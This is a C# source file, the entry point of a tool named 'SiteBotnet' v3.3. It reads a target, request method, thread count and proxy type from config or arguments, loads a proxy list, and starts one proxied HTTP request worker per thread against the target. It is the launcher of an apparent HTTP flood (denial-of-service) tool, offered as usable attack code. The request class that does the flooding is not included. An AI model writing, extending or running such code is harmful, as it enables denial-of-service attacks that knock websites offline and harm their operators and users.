using System;
using System.Collections.Generic;
using System.IO;
using ConfigParser;

namespace SiteBotnet3
{
    class Program
    {
        private static readonly string AppName = "SiteBotnet";
        private static readonly string AppVersion = "3.3";

        static void Main(string[] args)
        {
            if (!File.Exists("proxies.txt")) File.WriteAllText("proxies.txt", "");

            string Method;
            string Target;
            int Threads;
            string ProxyType;
            List<string> ProxyList = new List<string>(File.ReadAllLines("proxies.txt"));

            if (args.Length == 0)
            {
                Parser p = new Parser("config.txt");
                Method = p.ReadConfig("Method").ToString().Split('=')[1].Replace(" ", "");
                Target = p.ReadConfig("Target").ToString().Split('=')[1].Replace(" ", "");
                Threads = Convert.ToInt32(p.ReadConfig("Threads").ToString().Split('=')[1].Replace(" ", ""));
                ProxyType = p.ReadConfig("ProxyType").ToString().Split('=')[1].Replace(" ", "");
            }
            else
            {
                Method = args[0];
                Target = args[1];
                Threads = Convert.ToInt32(args[2]);
                ProxyType = args[3];
            }

            Console.Title = AppName + " v" + AppVersion;

            for (int i = 0; i < Threads; i++)
            {
                Requests req = new Requests("[ThreadHttp-" + i + "]");
                req.SetMethod(Method);
                req.SetTarget(Target);
                req.SetThreads(Threads);
                req.SetProxyType(ProxyType);
                req.SetProxyList(ProxyList);
                req.Start(true);
            }

            return;
        }
    }
}
